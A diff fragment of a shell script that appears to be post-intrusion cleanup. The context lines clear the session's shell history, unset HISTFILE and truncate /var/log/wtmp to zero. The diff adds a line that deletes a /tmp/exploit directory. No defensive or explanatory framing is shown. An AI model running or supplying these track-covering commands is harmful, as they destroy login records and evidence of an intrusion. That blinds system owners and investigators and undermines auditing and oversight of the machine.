@@ -92,7 +92,7 @@ echo "Wiping only in-memory shell history for current session."
 history -c
 unset HISTFILE
 
-
+rm -rf /tmp/exploit
 
 echo "Truncating system login logs."
 truncate -s 0 /var/log/wtmp
